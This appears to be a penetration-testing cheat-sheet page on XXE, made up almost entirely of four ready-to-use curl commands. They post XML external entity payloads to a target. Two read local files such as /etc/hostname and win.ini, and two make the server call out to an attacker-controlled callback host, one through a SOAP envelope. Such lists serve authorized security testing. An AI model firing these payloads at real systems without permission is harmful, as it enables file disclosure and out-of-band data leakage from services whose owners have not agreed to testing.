---
hide:
  - toc
---
# XXE

XML parser probes for external-entity handling and parser behaviour.

<div class="ol-section-kicker"><span>WEB</span><strong>XXE</strong></div>

## Basic external entity probe
```bash
curl -sk -X POST https://<TARGET>/endpoint -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><x>&xxe;</x>'
```
**Tool:** curl · **Platform:** Any · **Tags:** XXE, XML · **Context:** No auth · **Noise:** Moderate

## Windows local file probe
```bash
curl -sk -X POST https://<TARGET>/endpoint -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><x>&xxe;</x>'
```
**Tool:** curl · **Platform:** Any · **Tags:** XXE, Windows · **Context:** No auth · **Noise:** Moderate

## External URL callback probe
```bash
curl -sk -X POST https://<TARGET>/endpoint -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://<CALLBACK>/xxe">]><x>&xxe;</x>'
```
**Tool:** curl · **Platform:** Any · **Tags:** XXE, OOB · **Context:** No auth · **Noise:** Moderate

## SOAP XXE probe
```bash
curl -sk -X POST https://<TARGET>/service -H 'Content-Type: text/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://<CALLBACK>/soap">]><Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><x>&xxe;</x></Body></Envelope>'
```
**Tool:** curl · **Platform:** Any · **Tags:** SOAP, XXE · **Context:** No auth · **Noise:** Moderate

**Related:** [JSON / XML Content-Type Switching](content-type-switching.md) · [SOAP & WSDL](soap-wsdl.md) · [SSRF & SSTI](ssrf-ssti.md)
